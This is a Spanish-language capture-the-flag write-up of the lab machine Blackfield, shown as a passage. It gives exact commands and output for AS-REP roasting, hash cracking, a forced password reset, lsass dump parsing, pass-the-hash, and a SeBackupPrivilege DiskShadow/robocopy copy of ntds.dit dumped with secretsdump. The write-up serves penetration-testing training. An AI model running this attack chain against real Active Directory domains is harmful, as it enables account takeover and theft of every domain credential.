	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SLewrie
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SMaskil
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	Smocker
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SMoyta
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SRaustiala
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SReppond
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SSicliano
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SSilex
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SSolsbak
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	STousignaut
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	support
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	svc_backup
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SWhyte
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SWynigear
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TAwaysheh
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TBadenbach
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TCaffo
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TCassalom
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TEiselt
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TFerencdo
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TGaleazza
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TKauten
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TKnupke
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TLintlop
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TMusselli
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TOust
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TSlupka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TStausland
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TZumpella
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	UCrofskey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	UMarylebone
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	UPyrke
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VBublavy
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VButziger
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VFuscca
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VLitschauer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VMamchuk
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VMarija
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VOlaosun
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	VPapalouca
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	WSaldat
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	WVerzhbytska
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	WZelazny
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XBemelen
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XDadant
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XDebes
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XKonegni
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	XRykiel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YBleasdale
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YHuftalin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YKivlen
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YKozlicki
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YNyirenda
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YPredestin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YSeturino
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YSkoropada
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YVonebers
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	YZarpentine
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZAlatti
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZKrenselewski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZMalaab
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZMiick
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZScozzari
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZTimofeeff
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ZWausik
	SYSVOL                                            	NO ACCESS	Logon server share 
```

Podemos observar una amplia variedad de directorios almacenados en este recurso compartido. Parece ser que estos directorios están nombrados con nombres de usuario. Podríamos considerar la posibilidad de extraer estos nombres de directorios para luego verificar si alguno de estos nombres de usuario existe a nivel del sistema.

Para lograrlo, aplicaré un proceso de filtrado especial para retener exclusivamente estas cadenas de texto:

```
elswix@kali$ smbmap -H 10.10.10.192 -u 'elswix' -r "profiles$" --no-banner | awk '{print $NF}' | awk '/AAlleni/,/ZWausik/' > users.txt
```

Hecho esto, procederé a utilizar la herramienta [Kerbrute](https://github.com/ropnop/kerbrute) para verificar la validez de estos usuarios a través de Kerberos. Dado que hay varios usuarios, este proceso podría llevar tiempo, por lo que agradeceré su paciencia mientras se lleva a cabo.

```
elswix@kali$ kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/20/23 - Ronnie Flathers @ropnop

2023/09/20 20:25:58 >  Using KDC(s):
2023/09/20 20:25:58 >  	10.10.10.192:88

2023/09/20 20:26:20 >  [+] VALID USERNAME:	audit2020@BLACKFIELD.local
2023/09/20 20:28:24 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:20e163b93a99dffcebc4a5b149aba0c5$00b8461daae750ed64ba31205c919971c4e79e42daba826ec2ba6a3c22b82fe82f59733a0726064db9dad4800dd32e377ab37b743d02016c3811fce1d58d0345bd8066012840daf1607672e1e396b0425173ccb56eccc5c0995da4caeddd6ad597a68cbf6911b1d14eb3fc0be52ae70104a958acb6f9ad6dbd248ec95563e68e0d0a8b0617d286f8d7a093a86c9656300a4d829e31a5ac5c4d6ecf63fbc53f189c470a356b51dfe4d50f45e7a1283d064f6c6c72a628d2d2414e1069008bd9f0beeecbe05ee8872baa2da0f09050ac580a2b26ecd8311b150f4b8ff4bdbea057bd245820d9f969137a5d3025acab279553595e233fe52d00aa792b774fe0f99794ddbe8b419ddcfb
2023/09/20 20:28:24 >  [+] VALID USERNAME:	support@BLACKFIELD.local
2023/09/20 20:28:28 >  [+] VALID USERNAME:	svc_backup@BLACKFIELD.local
2023/09/20 20:28:57 >  Done! Tested 314 usernames (3 valid) in 179.292 seconds
```


Además, hemos identificado que el usuario `support` es vulnerable a un ataque de ASREP Roast, ya que posee el atributo `UF_DONT_REQUIERE_PREAUTH` configurado, lo que significa que no requiere autenticación previa de Kerberos. Esto nos permite solicitar un Ticket Granting Ticket (TGT) sin la necesidad de especificar credenciales.

Existe la posibilidad de intentar descifrar el Ticket Granting Ticket (TGT) para obtener la contraseña del usuario en texto claro. Para llevar a cabo esta tarea, emplearemos la herramienta [John](https://github.com/openwall/john).

Quiero destacar que en mi caso, el TGT que me devolvió la herramienta `Kerbrute` para el usuario `support` no me dejó Romperlo, por lo que tuve que volver a solicitarlo utilizando `GetNPUsers.py` de la suite de [Impacket](https://github.com/fortra/impacket).

Almacené los usuarios válidos en un archivo denominado `valid_users.txt` y ejecuté el ataque:

```
elswix@kali$ impacket-GetNPUsers BLACKFIELD.local/ -no-pass -usersfile valid_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:73183cc96fff92aa7b4c50bcd5a8172d$fda73713f921e0055962597efe5e0e286f46076b8b88867f50a2635c927e9e1a391d63193e38bc8ac48100bd117e22a71ddf7259634ba266ed732061bd84642533c3e41c9241f56dd0d131f7ddc07f8194c275675abab552d53a59577ad8c465b6696158275ed3abe582b765bfb032b69186d8fc335e2108111b38370c949849e5d6933c54bf6e573643d02db4e63655274512ddd24be4a76800dc94cd1af6c77185d9391d908dea76448307018ac193b8de21e29f8c830d64f8c00e87f9d287ed43ddddcbb4f2e51fdecced775eaa30621f281be9fc381ee0fdb6676bc5cbb7214b0f6fda622d2ddab9f79e3223f1055bb17a0c
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Guardé el hash en un archivo llamado `hash` y esta vez, logré romper el hash de forma exitosa:

```
elswix@kali$ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:20 DONE (2023-09-20 20:36) 0.04885g/s 700291p/s 700291c/s 700291C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


Comprobamos las credenciales utilizando [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec):

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
```

Con credenciales válidas a nuestra disposición, ampliamos significativamente nuestras posibilidades para llevar a cabo ataques. Entre las opciones disponibles se encuentra el ataque Kerberoast, aunque debo adelantar que en este caso no arrojó resultados.

En este punto, considerar realizar enumeraciones más exhaustivas del dominio, incluyendo la lista de usuarios válidos, grupos y otros elementos, es una opción viable. Sin embargo, dado que no se cuenta con acceso directo al sistema, se requiere una alternativa que permita llevar a cabo estas enumeraciones de forma remota.

[Bloodhound-python](https://github.com/dirkjanm/BloodHound.py) es una alternativa útil, ya que permite realizar la misma enumeración que SharpHound, aunque es posible que no proporcione la misma cantidad de información detallada. Aun así, es una herramienta poderosa para obtener una visión más profunda del dominio de manera remota.

Es importante tener en cuenta que, para analizar la información reportada, es necesario contar con las herramientas [BloodHound](https://github.com/BloodHoundAD/BloodHound) y [Neo4j](https://neo4j.com/) previamente instaladas en nuestro sistema. 

```
elswix@kali$ bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d BLACKFIELD.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 47S
```


Una vez finalizado este escaneo, se generarán los siguientes archivos en el directorio de trabajo actual:

```
elswix@kali$ ls -l
-rw-r--r-- 1 elswix elswix  47310 Sep 20 20:46 20230920204559_computers.json
-rw-r--r-- 1 elswix elswix  55582 Sep 20 20:46 20230920204559_containers.json
-rw-r--r-- 1 elswix elswix   3148 Sep 20 20:46 20230920204559_domains.json
-rw-r--r-- 1 elswix elswix   4032 Sep 20 20:46 20230920204559_gpos.json
-rw-r--r-- 1 elswix elswix  81312 Sep 20 20:46 20230920204559_groups.json
-rw-r--r-- 1 elswix elswix   1668 Sep 20 20:46 20230920204559_ous.json
-rw-r--r-- 1 elswix elswix 784312 Sep 20 20:46 20230920204559_users.json
```

Si no estás familiarizado con el uso de BloodHound, te recomiendo que consultes esta [documentación](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux) acerca de si uso. Esto te proporcionará una guía detallada para poder utilizar esta herramienta.

Después de realizar un análisis inicial a través de BloodHound, hemos descubierto que el usuario del cual tenemos credenciales posee permisos para cambiar la contraseña del usuario `Audit2020`.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Hard/Blackfield/img/1.png?raw=true)


Podemos cambiar su contraseña de forma remota utilizando varias herramientas, en mi caso utilizaré [bloodyAD](https://github.com/CravateRouge/bloodyAD).

```
elswix@kali$ bloodyAD -d BLACKFIELD.local -u 'support' -p '#00^BlackKnight' --host 10.10.10.192 set password audit2020 'Password123$!'
[+] Password changed successfully!
```

Comprobamos si logramos cambiar las credenciales:

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'Password123$!'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123$! 
```

La contraseña del usuario `audit2020` ha sido cambiada correctamente. 

Cuando enumeramos los recursos compartidos a nivel de red utilizando las credenciales del usuario `audit2020`, observamos que ahora tenemos acceso a dos nuevos recursos: `SYSVOL` y `forensic`.

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'Password123$!' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Password123$! 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```


Existen formas de aprovechar el recurso `SYSVOL`, aunque, ya les adelanto que en esta máquina no aplica. Sabiendo esto, accederemos al recurso `forensic`.

En esta ocasión, utilizaré `smbclient` para navegar de manera más interactiva a través del recurso compartido. También es posible montar el recurso compartido en tu máquina de ataque a nivel de red. En mi caso, opté por utilizar `smbclient`.

Para acceder, proporcionaremos el nombre de usuario con el que deseamos iniciar sesión, y se nos solicitará la contraseña que hemos establecido previamente para el usuario `audit2020`.

```
elswix@kali$ smbclient //10.10.10.192/forensic -U "audit2020"
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> 
```


### Shell as svc_backup


Después de llevar a cabo una breve enumeración, llamó mi atención el directorio denominado `memory_analysis`, el cual contenía lo siguiente:

```
smb: \> cd memory_analysis
smb: \memory_analysis\> dir
  .                                   D        0  Thu May 28 17:28:33 2020
  ..                                  D        0  Thu May 28 17:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 17:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 17:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 17:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 17:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 17:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 17:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 17:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 17:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 17:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 17:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 17:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 17:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 17:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 17:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 17:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 17:27:53 2020

		5102079 blocks of size 4096. 1602849 blocks available
smb: \memory_analysis\> 
```

Inmediatamente me llamó la atención el archivo lsass.zip.

LSASS, es un componente fundamental en los sistemas operativos Windows. Su función principal es administrar la seguridad y la autenticación en el sistema. LSASS desempeña un papel clave en la autenticación de usuarios, la gestión de contraseñas, el control de acceso y la seguridad en general en sistemas Windows.

Acto seguido, procedí a descargar el archivo y lo descomprimí en mi máquina de atacante:

```
smb: \memory_analysis\> get lsass.zip
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (5044.1 KiloBytes/sec) (average 5044.1 KiloBytes/sec)
smb: \memory_analysis\> 
```

```
elswix@kali$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP               
```

Al descomprimirlo, nos encontramos con el archivo `lsass.DMP`, el cual es un archivo de volcado de memoria generado por el proceso LSASS en Windows.

Podemos intentar analizarlo utilizando la herramienta [pypykatz](https://github.com/skelsec/pypykatz), que es la alternativa en Python a `mimikatz`. No mostraré el output aquí, ya que es bastante extenso.

```
elswix@kali$ pypykatz lsa minidump lsass.DMP
```

Podemos destacar que en el archivo se muestran varios hashes correspondientes a las credenciales de usuarios del sistema. Aunque se encontraron varios de estos hashes, solo el del usuario `svc_backup` resultó funcional.

Copié el hash NT del usuario `svc_backup` para verificar su validez utilizando la herramienta `CrackMapExec`. Los hashes NT nos permiten utilizar la técnica de `PassTheHash`, que en términos simples, nos permite proporcionar el hash como si fuera la "contraseña", por así decirlo.

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
```


Hemos confirmado que el hash es válido y que podemos utilizarlo como método de autenticación para el usuario `svc_backup`.

Ahora, procederemos a verificar si el usuario `svc_backup` puede conectarse mediante el servicio WinRM. En el caso de que este usuario pertenezca al grupo `Remote Management Users`, podremos utilizar herramientas como `Evil-WinRM` para intentar establecer una conexión al servicio y obtener una Shell.


```
elswix@kali$ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

Hemos confirmado que el usuario `svc_backup` puede acceder al servicio WinRM. Por lo tanto, procederemos a utilizar la herramienta `Evil-WinRM` para intentar acceder al servicio y obtener una Shell.

```
elswix@kali$ evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```

Logramos acceder al servicio y obtuvimos una shell como el usuario `svc_backup`. 

Si nos desplazamos al directorio `Desktop`, logramos visualizar la primera flag. 

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920b*********************4b543
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> 
```



### Shell as Administrator

Al listar nuestros privilegios, notamos que contamos con el privilegio `SeBackupPrivilege`. Este privilegio puede ser de gran importancia, ya que a través de copias de seguridad (backups), podríamos intentar clonar la estructura raíz del sistema para acceder a recursos a los que inicialmente no tenemos acceso debido a limitaciones de privilegios.

```
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> 
```


###### Disk Shadow

Emplearemos la herramienta DiskShadow para "clonar" la raíz del sistema. Haciendo uso de esta [documentación](https://pentestlab.blog/tag/diskshadow/), nos podemos guiar para realizar los pasos correctamente.

_"**DiskShadow** is a Microsoft signed binary which is used to assist administrators with operations related to the Volume Shadow Copy Service (VSS). Originally [bohops](https://twitter.com/bohops) wrote about this binary in his [blog](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/). This binary has two modes **interactive** and **script** and therefore a script file can be used that will contain all the necessary commands to automate the process of NTDS.DIT extraction. The script file can contain the following lines in order to create a new volume shadow copy, mount a new drive, execute the copy command and delete the volume shadow copy."_

_[PentestLab](https://pentestlab.blog/tag/diskshadow/)_

La idea principal aquí es crear una "copia" de la estructura raíz del sistema y luego realizar una copia de seguridad (backup) del archivo `ntds.dit`, todo esto aprovechando el privilegio `SeBackupPrivilege`. Esto nos permitirá realizar un volcado (dump) del archivo `ntds.dit` utilizando la herramienta `secretsdump` de la suite [Impacket](https://github.com/fortra/impacket).

¿Por qué no realizar este proceso directamente desde la raíz original del sistema?

La razón principal radica en que el archivo `ntds.dit` se encuentra en uso por un proceso en ejecución, lo que impide copiarlo directamente. Además, para acceder al archivo se requieren privilegios de Administrador que, en este contexto, no poseemos. Por tanto, la técnica de "clonación" y copia de seguridad nos proporciona un camino alternativo para obtener el archivo `ntds.dit` sin interrumpir los procesos en curso y sin necesidad de privilegios de Administrador ya que abusaremos del privilegio `SeBackupPrivilege`.

Primeramente debemos crear un archivo con el siguiente contenido:

```
elswix@kali$ cat shadow.txt
set context persistent nowriters-
add volume c: alias elswix-
create-
expose %elswix% y:-
```

Agregando cualquier carácter al final de cada línea, en mi caso utilicé `-`, aseguramos que cada línea tenga un carácter o espacio en blanco al final. Esto es importante porque la herramienta elimina el último carácter de cada línea.

Para trabajar de forma organizada, crearé un directorio llamado `Privesc` en la ruta `C:\Windows\Temp` de la máquina víctima.

```
*Evil-WinRM* PS C:\Windows\Temp> mkdir Privesc
```

Una vez descargado el archivo `shadow.txt` en la máquina víctima, debemos ejecutar lo siguiente:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> diskshadow /s C:\Users\svc_backup\Desktop\shadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  9/20/2023 2:49:25 PM

-> set context persistent nowriters
-> add volume c: alias elswix
-> create
Alias elswix for shadow ID {d885ad3a-5167-4d00-8760-08197855c105} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c96e7221-8964-4fdf-8fad-86ae1c1722f6} set as environment variable.

Querying all shadow copies with the shadow copy set ID {c96e7221-8964-4fdf-8fad-86ae1c1722f6}

	* Shadow copy ID = {d885ad3a-5167-4d00-8760-08197855c105}		%elswix%
		- Shadow copy set: {c96e7221-8964-4fdf-8fad-86ae1c1722f6}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 9/20/2023 2:49:26 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
		- Originating machine: DC01.BLACKFIELD.local
		- Service machine: DC01.BLACKFIELD.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %elswix% y:
-> %elswix% = {d885ad3a-5167-4d00-8760-08197855c105}
The shadow copy was successfully exposed as y:\.
->
*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

Si todo funciona correctamente, se debería de mostrar en pantalla el mensaje: `The shadow copy was successfully exposed as y:\.` 


Si listamos el contenido de la unidad `y:\`, notamos que hemos "clonado" correctamente la raíz del sistema:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> dir y:\


    Directory: y:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-----        9/20/2023  12:59 PM                Temp
d-r---        2/23/2020   9:16 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt


*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```


Si intentamos copiar el archivo `ntds.dit` directamente utilizando el comando `cp`, se nos notifica que no contamos con los privilegios necesarios:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> cp y:\Windows\NTDS\ntds.dit .
Access to the path 'y:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ cp y:\Windows\NTDS\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (y:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

Sin embargo, haciendo uso del privilegio `SeBackupPrivilege`, tenemos la capacidad de utilizar el comando `robocopy` para crear una copia de seguridad del archivo.

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> robocopy /b Y:\Windows\NTDS . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, September 20, 2023 3:04:41 PM
   Source : Y:\Windows\NTDS\
     Dest : C:\Windows\Temp\Privesc\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	Y:\Windows\NTDS\
	   New File  		 18.0 m	ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  1.3%
  1.7%
  2.0%
  2.4%
  2.7%
  3.1%
  3.4%
  3.8%
........
 92.0%
 92.3%
 92.7%
 93.0%
 93.4%
 93.7%
 94.0%
 94.4%
 94.7%
 95.1%
 95.4%
 95.8%
 96.1%
 96.5%
 96.8%
 97.2%
 97.5%
 97.9%
 98.2%
 98.6%
 98.9%
 99.3%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           174762666 Bytes/sec.
   Speed :           10000.000 MegaBytes/min.
   Ended : Wednesday, September 20, 2023 3:04:41 PM

*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```


Listando el contenido del directorio actual, confirmamos que se ha realizado una copia del archivo `ntds.dit`, por lo que ya podemos utilizarlo para dumpearlo. 

Antes de trasladarlo a nuestra máquina de atacante, debemos hacer una copia del registro del sistema:

```
*Evil-WinRM* PS C:\Windows\Temp\Privesc> reg save HKLM\System system
The operation completed successfully.

*Evil-WinRM* PS C:\Windows\Temp\Privesc> 
```

Una vez descargados ambos archivos en nuestra máquina, procederemos a dumpear el archivo ntds.dit.

```
elswix@kali$ ls -l
total 35600
-rwxr-xr-x 1 elswix elswix 18874368 Sep 20 15:47 ntds.dit
-rwxr-xr-x 1 elswix elswix 17580032 Sep 20 19:06 system
```

Para dumpear el archivo ntds.dit, utilizaremos la herramienta previamente mencionada, `secretsdump`, perteneciente a la suite de Impacket:

```
elswix@kali$ impacket-secretsdump -system system -ntds ntds.dit LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
